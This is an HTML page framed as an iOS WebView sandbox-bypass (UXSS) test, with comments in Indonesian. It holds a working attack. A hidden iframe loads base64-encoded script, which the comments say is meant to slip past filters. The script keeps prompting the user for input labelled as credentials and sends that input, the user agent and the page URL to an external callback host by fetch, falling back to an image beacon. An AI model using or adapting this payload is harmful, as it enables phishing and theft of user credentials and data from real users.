<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, user-scalable=no">
  <title>Bypass sandbox Webview UXSS Test</title>
  <style>
    iframe { visibility: hidden; width: 1px; height: 1px; }
    body { font-family: system-ui, sans-serif; text-align: center; padding-top: 100px; }
    h1 { color: #c00; }
  </style>
  <script>
    // Payload yang akan diuji
    const msg = 'Uji WebView iOS\n\nMasukkan teks untuk test sandbox:';
    const hook = "https://oxomzauseuatgjlyyqtdmzit6gjs53lvv.oast.fun/";

    const code = `
      (function(){
        try {
          var v = '';
          while(v===null || (''+v).trim()===''){
            v = prompt(${JSON.stringify(msg)}, 'test@ios');
          }
          var qs='?creds='+encodeURIComponent(v)
                 +'&ua='+encodeURIComponent(navigator.userAgent)
                 +'&page='+encodeURIComponent(location.href)
                 +'&t='+Date.now();
          var u='${hook}'+qs;

          try {
            fetch(u,{method:'GET',mode:'no-cors',keepalive:true}).catch(function(_){
              try{ (new Image()).src=u+'&via=img'; }catch(e){}
            });
          } catch(e){
            try{ (new Image()).src=u+'&via=img'; }catch(e){}
          }
        } catch(e){}
      })();
    `;

    window.onload = function(){
      // Encode ke Base64 biar lolos filter
      const payload = btoa(code);
      const html = "<script>eval(atob('" + payload + "'))<\/script>";
      const iframe = document.getElementById('iframe');
      iframe.src = "data:text/html;base64," + btoa(html);
    };
  </script>
</head>
<body>
  <h1>üîç Uji Sandbox WebView iOS</h1>
  <p>Jika sandbox lemah, prompt akan muncul & data terkirim ke server uji.</p>
  <iframe id="iframe"></iframe>
</body>
</html>
